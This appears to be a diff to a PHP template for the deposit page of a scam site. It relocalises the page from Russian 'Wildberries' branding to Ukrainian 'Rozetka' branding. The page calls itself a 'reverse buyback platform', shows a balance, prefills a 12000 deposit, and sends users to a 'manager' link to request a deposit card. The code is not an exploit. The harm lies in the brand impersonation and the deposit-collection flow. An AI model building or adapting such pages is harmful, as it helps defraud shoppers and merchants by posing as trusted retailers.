@@ -11,11 +11,11 @@
 	</style>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
-	<title> cейчас депозит - Wildberries</title>
-	<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
-	<meta name="description" content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
+	<title>зараз депозит - Rozetka</title>
+	<meta name="keywords" content="Платформа зворотного викупу для українських торговців">
+	<meta name="description" content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради по догляду за речами.">
 	<meta name="format-detection" content="telephone=no">
-	<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
+	<link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
 	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css") ?>">
 	<script type="text/javascript" src="<?php echo asset("assets/jquery.js") ?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/global.js") ?>"></script>
@@ -26,15 +26,15 @@
 <body>
 	<div class="pagetop">
 		<div class="fh"><a href="javascript:history.back(-1)"></a></div>
-		<div> cейчас депозит</div>
+		<div>зараз депозит</div>
 		<!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
 		<!-- 
 <div class="top_menu" id="top_menu">
 	<ul>
-	<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Главная</span></a></li>
+	<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Головна</span></a></li>
 	<li><a href="https://wbbff.cc/index.php/category/list"><i class="top_tb2"></i><span>Каталог</span></a></li>
-	<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Корзина</span></a></li>
-	<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профиль</span></a></li>
+	<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Кошик</span></a></li>
+	<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профіль</span></a></li>
 	</ul>
 	<div class="clear"></div>
 </div> -->
@@ -44,20 +44,20 @@
 			<div class="zc_box2 mat10">
 				<div class="zc_list">
 					<div class="zc_name">баланс</div>
-					<div class="zc_text"><span class="num strong corg">{{ Auth::user()->balance }}</span> ₾.</div>
+					<div class="zc_text"><span class="num strong corg">{{ Auth::user()->balance }}</span> ₴.</div>
 				</div>
 				<div class="zc_list">
-					<div class="zc_name">количество</div>
-					<div class="zc_text"><input type="text" name="order_money" placeholder="введите cумма вклада" value="12000"></div>
+					<div class="zc_name">кількість</div>
+					<div class="zc_text"><input type="text" name="order_money" placeholder="введіть суму вкладу" value="12000"></div>
 				</div>
 				<!-- 		<div class="zc_list">
 			<div class="zc_name"></div>
-			<div class="zc_text" id="payment_btn">银行转账</div>
+			<div class="zc_text" id="payment_btn">банківський переказ</div>
 			<i class="jt_r"></i>
 		</div>  -->
 			</div>
 			<div class="loginbtn" style="margin:15px 12px;">
-				<input type="button" value="Отправить">
+				<input type="button" value="Відправити">
 				<input type="hidden" name="pe_token" value="75236c7c5fdf7ebfe3441c02863d0cb8">
 				<input type="hidden" name="pesubmit">
 			</div>
@@ -65,7 +65,7 @@
 
 		</div>
 		<div id="page_payment" class="divhide">
-			<div class="add_tt">Выберите способ оплаты</div>
+			<div class="add_tt">Виберіть спосіб оплати</div>
 			<div class="close_btn" onclick="app_page_close();"></div>
 			<div>
 			</div>
@@ -86,7 +86,7 @@
 		}
 
 		$(function() {
-			//支付方式
+			//спосіб оплати
 			// pe_select_radio('order_payment', $(":input[name='order_payment']:eq(1)").val(), function(json){
 			// 	$("#payment_btn").html($(":input[name='order_payment']:checked").attr("payment_name"));
 			// 	app_page_close();
@@ -95,7 +95,7 @@
 				var order_payment = $(":input[name='order_payment']:checked").val();
 				var order_money = pe_num($(":input[name='order_money']").val(), 'floor', 1);
 				if (order_money < 0.1) {
-					app_tip("Минимальный лимит депозита：0.1");
+					app_tip("Мінімальний ліміт депозиту：0.1");
 					return false;
 				} else {
 
@@ -103,13 +103,13 @@
 
 				layer.open({
 					type: 4,
-					title: "Пополнить баланс",
+					title: "Поповнити баланс",
 					area: ['300px', '350px'],
-					fixed: false, //不固定
+					fixed: false, //не фіксований
 					shadeClose: true,
 					shade: 0.5,
-					content: "Определить сумму депозита и обратиться в службу поддержки для запроса депозитной карты?",
-					btn: ["Идти к", "Отмена"],
+					content: "Визначити суму депозиту і звернутися до служби підтримки для запиту депозитної картки?",
+					btn: ["Перейти до", "Скасувати"],
 					yes: function(index, layero) {
 						addchongzhi(order_money);
 						window.location.href = "{{ $settings->linkManager }}";
@@ -138,7 +138,7 @@
 	<script type="text/javascript" src="<?php echo asset("assets/layer.js") ?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/app.js") ?>"></script>
 	<script type="text/javascript">
-		//顶部菜单点击
+		//клік верхнього меню
 		function top_menu() {
 			if ($("#top_menu").is(":hidden")) {
 				$("#top_menu").show();
@@ -154,13 +154,13 @@
 	<script>
 		function confirm_huigou(order_id) {
 			layer.open({
-				content: "Определить выкуп этого Заказ？",
-				btn: ["OK", "Отмена"],
+				content: "Визначити викуп цього Замовлення？",
+				btn: ["OK", "Скасувати"],
 				shadeClose: false,
 				yes: function() {
 
 					/*layer.open({
-						content: '你点了确认',
+						content: 'ви натиснули підтвердити',
 						time: 1
 					});*/
 					$.ajax({
